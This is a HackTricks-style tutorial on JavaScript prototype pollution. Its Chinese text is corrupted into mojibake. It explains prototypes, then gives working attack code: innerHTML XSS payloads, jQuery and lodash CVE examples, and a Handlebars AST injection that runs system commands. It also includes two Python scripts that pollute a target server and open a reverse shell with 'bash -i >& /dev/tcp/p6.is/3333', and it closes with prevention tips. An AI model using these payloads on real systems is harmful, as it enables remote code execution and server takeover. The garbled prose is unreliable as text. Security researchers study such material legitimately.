# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## JavaScriptä¸­çš„å¯¹è±¡ <a href="#053a" id="053a"></a>

JavaScriptä¸­çš„å¯¹è±¡æœ¬è´¨ä¸Šæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œç§°ä¸ºå±æ€§ã€‚å¯ä»¥ä½¿ç”¨`Object.create`æ–¹æ³•å¹¶å°†`null`ä½œä¸ºå‚æ•°æ¥åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚è¿™ç§æ–¹æ³•å…è®¸åˆ›å»ºä¸€ä¸ªæ²¡æœ‰ä»»ä½•ç»§æ‰¿å±æ€§çš„å¯¹è±¡ã€‚
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
### JavaScriptä¸­çš„å‡½æ•°å’Œç±»

åœ¨JavaScriptä¸­ï¼Œç±»å’Œå‡½æ•°å¯†åˆ‡ç›¸å…³ï¼Œå‡½æ•°ç»å¸¸å……å½“ç±»çš„æ„é€ å‡½æ•°ã€‚å°½ç®¡JavaScriptç¼ºä¹åŸç”Ÿç±»æ”¯æŒï¼Œä½†æ„é€ å‡½æ•°å¯ä»¥æ¨¡æ‹Ÿç±»çš„è¡Œä¸ºã€‚
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### JavaScriptä¸­çš„åŸå‹

JavaScriptå…è®¸åœ¨è¿è¡Œæ—¶ä¿®æ”¹ã€æ·»åŠ æˆ–åˆ é™¤åŸå‹å±æ€§ã€‚è¿™ç§çµæ´»æ€§ä½¿å¾—å¯ä»¥åŠ¨æ€æ‰©å±•ç±»çš„åŠŸèƒ½ã€‚

åƒ`toString`å’Œ`valueOf`è¿™æ ·çš„å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹ä»¥æ”¹å˜å®ƒä»¬çš„è¡Œä¸ºï¼Œå±•ç¤ºäº†JavaScriptåŸå‹ç³»ç»Ÿçš„é€‚åº”æ€§ã€‚

## ç»§æ‰¿

åœ¨åŸºäºåŸå‹çš„ç¼–ç¨‹ä¸­ï¼Œå±æ€§/æ–¹æ³•æ˜¯ä»ç±»ç»§æ‰¿åˆ°å¯¹è±¡çš„ã€‚è¿™äº›ç±»æ˜¯é€šè¿‡å°†å±æ€§/æ–¹æ³•æ·»åŠ åˆ°å¦ä¸€ä¸ªç±»çš„å®ä¾‹æˆ–ç©ºå¯¹è±¡ä¸­åˆ›å»ºçš„ã€‚

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“å°†å±æ€§æ·»åŠ åˆ°ç”¨ä½œå…¶ä»–å¯¹è±¡åŸå‹ï¼ˆå¦‚`myPersonObj`ï¼‰çš„å¯¹è±¡æ—¶ï¼Œç»§æ‰¿å¯¹è±¡å°±å¯ä»¥è®¿é—®è¿™ä¸ªæ–°å±æ€§ã€‚ç„¶è€Œï¼Œé™¤éæ˜¾å¼è°ƒç”¨ï¼Œå¦åˆ™è¿™ä¸ªå±æ€§ä¸ä¼šè‡ªåŠ¨æ˜¾ç¤ºã€‚

## \_\_proto\_\_æ±¡æŸ“ <a href="#0d0a" id="0d0a"></a>

## æ¢ç´¢JavaScriptä¸­çš„åŸå‹æ±¡æŸ“

JavaScriptå¯¹è±¡ç”±é”®å€¼å¯¹å®šä¹‰ï¼Œå¹¶ä»JavaScriptå¯¹è±¡åŸå‹ç»§æ‰¿ã€‚è¿™æ„å‘³ç€ä¿®æ”¹å¯¹è±¡åŸå‹å¯èƒ½ä¼šå½±å“ç¯å¢ƒä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚

è®©æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„ç¤ºä¾‹æ¥è¯´æ˜ï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®ObjectåŸå‹ï¼š
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
é€šè¿‡å‘ObjectåŸå‹æ·»åŠ å±æ€§ï¼Œæ¯ä¸ªJavaScriptå¯¹è±¡éƒ½å°†ç»§æ‰¿è¿™äº›æ–°å±æ€§ï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## åŸå‹æ±¡æŸ“

å¯¹äºé™åˆ¶äº† `__proto__` ä½¿ç”¨çš„æƒ…å†µï¼Œä¿®æ”¹å‡½æ•°çš„åŸå‹æ˜¯ä¸€ç§æ›¿ä»£æ–¹æ³•ï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
è¿™ä»…å½±å“ä»`Vehicle`æ„é€ å‡½æ•°åˆ›å»ºçš„å¯¹è±¡ï¼Œä¸ºå®ƒä»¬æä¾›`beep`ã€`hasWheels`ã€`honk`å’Œ`isElectric`å±æ€§ã€‚

å…¨å±€å½±å“JavaScriptå¯¹è±¡çš„ä¸¤ç§æ–¹æ³•åŒ…æ‹¬ï¼š

1. ç›´æ¥æ±¡æŸ“`Object.prototype`ï¼š
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. æ±¡æŸ“å¸¸ç”¨ç»“æ„çš„æ„é€ å‡½æ•°åŸå‹ï¼š
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
## æ±¡æŸ“å…¶ä»–å¯¹è±¡

### ä»ç±»åˆ°Object.prototype

åœ¨ä¸€ä¸ªåœºæ™¯ä¸­ï¼Œä½ å¯ä»¥**æ±¡æŸ“ä¸€ä¸ªç‰¹å®šå¯¹è±¡**å¹¶ä¸”éœ€è¦**è®¿é—®`Object.prototype`**ï¼Œä½ å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹ä»£ç çš„æ–¹å¼æœç´¢å®ƒï¼š
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### æ•°ç»„å…ƒç´ æ±¡æŸ“

è¯·æ³¨æ„ï¼Œæ­£å¦‚æ‚¨å¯ä»¥æ±¡æŸ“JSå¯¹è±¡çš„å±æ€§ä¸€æ ·ï¼Œå¦‚æœæ‚¨å¯ä»¥æ±¡æŸ“ä¸€ä¸ªæ•°ç»„ï¼Œæ‚¨ä¹Ÿå¯ä»¥**æ±¡æŸ“æ•°ç»„çš„å€¼**ï¼Œè¿™äº›å€¼å¯ä»¥é€šè¿‡**ç´¢å¼•**è®¿é—®ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨æ— æ³•è¦†ç›–å€¼ï¼Œå› æ­¤æ‚¨éœ€è¦æ±¡æŸ“æŸç§æ–¹å¼ä½¿ç”¨ä½†æœªå†™å…¥çš„ç´¢å¼•ï¼‰ã€‚
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Htmlå…ƒç´ æ±¡æŸ“

åœ¨é€šè¿‡JSç”ŸæˆHTMLå…ƒç´ æ—¶ï¼Œå¯ä»¥**è¦†ç›–** **`innerHTML`** å±æ€§ï¼Œä½¿å…¶ç¼–å†™**ä»»æ„HTMLä»£ç ã€‚** [Idea and example from this writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## ä¾‹å­

### åŸºæœ¬ç¤ºä¾‹

åŸå‹æ±¡æŸ“æ˜¯ç”±äºåº”ç”¨ç¨‹åºä¸­å­˜åœ¨æ¼æ´ï¼Œå…è®¸åœ¨ `Object.prototype` ä¸Šè¦†ç›–å±æ€§ã€‚è¿™æ„å‘³ç€ç”±äºå¤§å¤šæ•°å¯¹è±¡ä» `Object.prototype` æ´¾ç”Ÿå…¶å±æ€§

æœ€ç®€å•çš„ç¤ºä¾‹æ˜¯å‘å°†è¦è¢«æ£€æŸ¥çš„å¯¹è±¡çš„**æœªå®šä¹‰å±æ€§**æ·»åŠ ä¸€ä¸ªå€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```javascript
if (user.admin) {
```
å¦‚æœå±æ€§ **`admin` æœªå®šä¹‰**ï¼Œå°±æœ‰å¯èƒ½æ»¥ç”¨åŸå‹æ±¡æŸ“å¹¶å°†å…¶è®¾ç½®ä¸º Trueï¼Œç±»ä¼¼äºä»¥ä¸‹æ“ä½œï¼š
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
è¿™èƒŒåçš„æœºåˆ¶æ¶‰åŠæ“çºµå±æ€§ï¼Œä»¥ä¾¿å¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æŸäº›è¾“å…¥ï¼Œä»–ä»¬å¯ä»¥ä¿®æ”¹åº”ç”¨ç¨‹åºä¸­æ‰€æœ‰å¯¹è±¡çš„åŸå‹ã€‚è¿™ç§æ“çºµé€šå¸¸æ¶‰åŠè®¾ç½®`__proto__`å±æ€§ï¼Œåœ¨JavaScriptä¸­ï¼Œè¿™ç­‰åŒäºç›´æ¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹ã€‚

å¯ä»¥æˆåŠŸæ‰§è¡Œæ­¤æ”»å‡»çš„æ¡ä»¶ï¼Œå¦‚ç‰¹å®š[ç ”ç©¶](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)ä¸­æ‰€è¿°ï¼ŒåŒ…æ‹¬ï¼š

- æ‰§è¡Œé€’å½’åˆå¹¶ã€‚
- åŸºäºè·¯å¾„å®šä¹‰å±æ€§ã€‚
- å…‹éš†å¯¹è±¡ã€‚
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Protoæ±¡æŸ“åˆ°RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“åˆ°XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: é€šè¿‡jQuery $ .extendè¿›è¡ŒåŸå‹æ±¡æŸ“æ”»å‡»

[æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥é˜…æ­¤æ–‡ç« ](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
åœ¨jQueryä¸­ï¼Œå¦‚æœæ·±åº¦å¤åˆ¶åŠŸèƒ½è¢«é”™è¯¯ä½¿ç”¨ï¼Œ`$ .extend`å‡½æ•°å¯èƒ½å¯¼è‡´åŸå‹æ±¡æŸ“ã€‚è¯¥å‡½æ•°é€šå¸¸ç”¨äºå…‹éš†å¯¹è±¡æˆ–ä»é»˜è®¤å¯¹è±¡åˆå¹¶å±æ€§ã€‚ç„¶è€Œï¼Œå½“é…ç½®é”™è¯¯æ—¶ï¼Œæœ¬åº”åˆ†é…ç»™æ–°å¯¹è±¡çš„å±æ€§å¯èƒ½è¢«åˆ†é…ç»™åŸå‹ã€‚ä¾‹å¦‚ï¼š
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
è¿™ä¸ªæ¼æ´ï¼Œè¢«æ ‡è¯†ä¸ºCVE-2019â€“11358ï¼Œè¯´æ˜äº†æ·±æ‹·è´å¯èƒ½ä¼šæ— æ„ä¸­ä¿®æ”¹åŸå‹ï¼Œå¯¼è‡´æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œæ¯”å¦‚å¦‚æœæœªç»é€‚å½“å­˜åœ¨æ€§éªŒè¯å°±æ£€æŸ¥è¯¸å¦‚`isAdmin`ä¹‹ç±»çš„å±æ€§ï¼Œå¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„ç®¡ç†å‘˜è®¿é—®ã€‚

### CVE-2018â€“3721ï¼ŒCVE-2019â€“10744ï¼šé€šè¿‡lodashè¿›è¡ŒåŸå‹æ±¡æŸ“æ”»å‡»

[æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤æ–‡ç« ](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) é‡åˆ°äº†ç±»ä¼¼çš„åŸå‹æ±¡æŸ“æ¼æ´ï¼ˆCVE-2018â€“3721ï¼ŒCVE-2019â€“10744ï¼‰ã€‚è¿™äº›é—®é¢˜å·²åœ¨ç‰ˆæœ¬4.17.11ä¸­å¾—åˆ°è§£å†³ã€‚

### å…·æœ‰CVEçš„å¦ä¸€ä¸ªæ•™ç¨‹

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### NodeJSä¸­çš„ASTåŸå‹æ±¡æŸ“

NodeJSåœ¨JavaScriptä¸­å¹¿æ³›ä½¿ç”¨æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰æ¥å®ç°è¯¸å¦‚æ¨¡æ¿å¼•æ“å’ŒTypeScriptä¹‹ç±»çš„åŠŸèƒ½ã€‚æœ¬èŠ‚æ¢è®¨äº†ä¸æ¨¡æ¿å¼•æ“ï¼ˆç‰¹åˆ«æ˜¯Handlebarså’ŒPugï¼‰ä¸­åŸå‹æ±¡æŸ“ç›¸å…³çš„æ¼æ´ã€‚

#### Handlebarsæ¼æ´åˆ†æ

Handlebarsæ¨¡æ¿å¼•æ“å®¹æ˜“å—åˆ°åŸå‹æ±¡æŸ“æ”»å‡»ã€‚æ­¤æ¼æ´æºè‡ª`javascript-compiler.js`æ–‡ä»¶ä¸­çš„ç‰¹å®šå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œ`appendContent`å‡½æ•°åœ¨å­˜åœ¨`pendingContent`æ—¶ä¼šè¿æ¥å®ƒï¼Œè€Œ`pushSource`å‡½æ•°åœ¨æ·»åŠ æºä»£ç åä¼šå°†`pendingContent`é‡ç½®ä¸º`undefined`ã€‚

##### æ”»å‡»è¿‡ç¨‹

åˆ©ç”¨Handlebarsç”Ÿæˆçš„ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰è¿›è¡Œæ”»å‡»çš„æ­¥éª¤å¦‚ä¸‹ï¼š

1. **è§£æå™¨çš„æ“çºµ**ï¼šé¦–å…ˆï¼Œè§£æå™¨é€šè¿‡`NumberLiteral`èŠ‚ç‚¹å¼ºåˆ¶å€¼ä¸ºæ•°å­—ã€‚åŸå‹æ±¡æŸ“å¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ï¼Œä½¿éæ•°å­—å­—ç¬¦ä¸²å¾—ä»¥æ’å…¥ã€‚
2. **ç¼–è¯‘å™¨çš„å¤„ç†**ï¼šç¼–è¯‘å™¨å¯ä»¥å¤„ç†ASTå¯¹è±¡æˆ–å­—ç¬¦ä¸²æ¨¡æ¿ã€‚å¦‚æœ`input.type`ç­‰äº`Program`ï¼Œåˆ™å°†è¾“å…¥è§†ä¸ºé¢„è§£æçš„ï¼Œè¿™å¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚
3. **ä»£ç æ³¨å…¥**ï¼šé€šè¿‡æ“çºµ`Object.prototype`ï¼Œå¯ä»¥å°†ä»»æ„ä»£ç æ³¨å…¥æ¨¡æ¿å‡½æ•°ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æ¼”ç¤ºåˆ©ç”¨Handlebarsæ¼æ´çš„ç¤ºä¾‹ï¼š
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
è¿™æ®µä»£ç å±•ç¤ºäº†æ”»å‡»è€…å¦‚ä½•å°†ä»»æ„ä»£ç æ³¨å…¥åˆ°Handlebarsæ¨¡æ¿ä¸­ã€‚

**å¤–éƒ¨å‚è€ƒ**: åœ¨'flat'åº“ä¸­å‘ç°äº†ä¸åŸå‹æ±¡æŸ“ç›¸å…³çš„é—®é¢˜ï¼Œè¯¦ç»†ä¿¡æ¯è¯·å‚é˜…: [GitHubä¸Šçš„é—®é¢˜](https://github.com/hughsk/flat/issues/105)ã€‚

**å¤–éƒ¨å‚è€ƒ**: ['flat'åº“ä¸­ä¸åŸå‹æ±¡æŸ“ç›¸å…³çš„é—®é¢˜](https://github.com/hughsk/flat/issues/105)

Pythonä¸­åŸå‹æ±¡æŸ“åˆ©ç”¨çš„ç¤ºä¾‹:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pugæ¼æ´

Pugï¼Œå¦ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œé¢ä¸´ç€åŸå‹æ±¡æŸ“çš„ç±»ä¼¼é£é™©ã€‚æœ‰å…³æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¯·å‚é˜…[Pugä¸­çš„ASTæ³¨å…¥è®¨è®º](https://blog.p6.is/AST-Injection/#Pug)ã€‚

Pugä¸­åŸå‹æ±¡æŸ“çš„ç¤ºä¾‹ï¼š
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### é¢„é˜²æªæ–½

ä¸ºäº†å‡å°‘åŸå‹æ±¡æŸ“çš„é£é™©ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ç­–ç•¥ï¼š

1. **å¯¹è±¡ä¸å¯å˜æ€§**ï¼šå¯ä»¥é€šè¿‡åº”ç”¨ `Object.freeze` æ¥ä½¿ `Object.prototype` ä¸å¯å˜ã€‚
2. **è¾“å…¥éªŒè¯**ï¼šJSON è¾“å…¥åº”è¯¥ä¸¥æ ¼æ ¹æ®åº”ç”¨ç¨‹åºçš„æ¨¡å¼è¿›è¡ŒéªŒè¯ã€‚
3. **å®‰å…¨åˆå¹¶å‡½æ•°**ï¼šåº”é¿å…ä¸å®‰å…¨ä½¿ç”¨é€’å½’åˆå¹¶å‡½æ•°ã€‚
4. **æ— åŸå‹å¯¹è±¡**ï¼šå¯ä»¥ä½¿ç”¨ `Object.create(null)` åˆ›å»ºæ²¡æœ‰åŸå‹å±æ€§çš„å¯¹è±¡ã€‚
5. **ä½¿ç”¨ Map**ï¼šåº”è¯¥ä½¿ç”¨ `Map` è€Œä¸æ˜¯ `Object` æ¥å­˜å‚¨é”®å€¼å¯¹ã€‚
6. **åº“æ›´æ–°**ï¼šå¯ä»¥é€šè¿‡å®šæœŸæ›´æ–°åº“æ¥æ•´åˆå®‰å…¨è¡¥ä¸ã€‚
7. **ä»£ç æ£€æŸ¥å·¥å…·**ï¼šä½¿ç”¨è¯¸å¦‚ ESLint ç­‰é€‚å½“æ’ä»¶çš„å·¥å…·æ¥æ£€æµ‹å’Œé˜²æ­¢åŸå‹æ±¡æŸ“æ¼æ´ã€‚
8. **ä»£ç å®¡æŸ¥**ï¼šå®æ–½å½»åº•çš„ä»£ç å®¡æŸ¥ï¼Œä»¥è¯†åˆ«å’Œæ¶ˆé™¤ä¸åŸå‹æ±¡æŸ“ç›¸å…³çš„æ½œåœ¨é£é™©ã€‚
9. **å®‰å…¨åŸ¹è®­**ï¼šæ•™è‚²å¼€å‘äººå‘˜æœ‰å…³åŸå‹æ±¡æŸ“çš„é£é™©ä»¥åŠç¼–å†™å®‰å…¨ä»£ç çš„æœ€ä½³å®è·µã€‚
10. **è°¨æ…ä½¿ç”¨åº“**ï¼šåœ¨ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“æ—¶è¦è°¨æ…ã€‚è¯„ä¼°å®ƒä»¬çš„å®‰å…¨çŠ¶å†µå¹¶å®¡æŸ¥å®ƒä»¬çš„ä»£ç ï¼Œç‰¹åˆ«æ˜¯é‚£äº›æ“ä½œå¯¹è±¡çš„åº“ã€‚
11. **è¿è¡Œæ—¶ä¿æŠ¤**ï¼šé‡‡ç”¨è¿è¡Œæ—¶ä¿æŠ¤æœºåˆ¶ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸“æ³¨äºå®‰å…¨çš„ npm åŒ…ï¼Œå¯ä»¥æ£€æµ‹å’Œé˜²æ­¢åŸå‹æ±¡æŸ“æ”»å‡»ã€‚

## å‚è€ƒèµ„æ–™

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„ **å…¬å¸åœ¨ HackTricks ä¸­è¢«å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ **HackTricks** å’Œ **HackTricks Cloud** github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
